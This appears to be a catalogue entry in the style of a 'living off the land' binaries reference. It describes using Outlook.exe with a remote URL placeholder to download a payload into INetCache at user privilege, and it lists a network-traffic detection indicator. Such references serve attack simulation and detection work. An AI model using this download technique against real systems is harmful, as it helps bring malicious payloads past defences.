title: Outlook.exe
html:

Commands

Download

Downloads payload from remote server

Use case: It will download a remote payload and place it in INetCache.

Privileges: User

Outlook.exe {REMOTEURL}

Detection

  • IOC: Suspicious Office application Internet/network traffic
